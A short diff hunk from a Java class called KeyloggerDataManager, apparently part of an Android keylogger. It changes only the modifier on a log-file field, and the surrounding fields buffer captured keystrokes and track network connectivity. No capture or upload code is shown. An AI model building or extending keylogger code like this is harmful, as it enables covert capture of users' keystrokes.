@@ -34,7 +34,7 @@ public class KeyloggerDataManager {
     /** Bộ đệm các keystroke dạng JSONObject (có cấu trúc), không còn là raw string */
     private final ConcurrentLinkedQueue<JSONObject> memoryBuffer;
     private final ScheduledExecutorService scheduler;
-    private final File logFile;
+    private File logFile;
     private final KeystrokeDatabase database;
     private ConnectivityManager.NetworkCallback networkCallback;
     private final AtomicBoolean socketListenerRegistered = new AtomicBoolean(false);
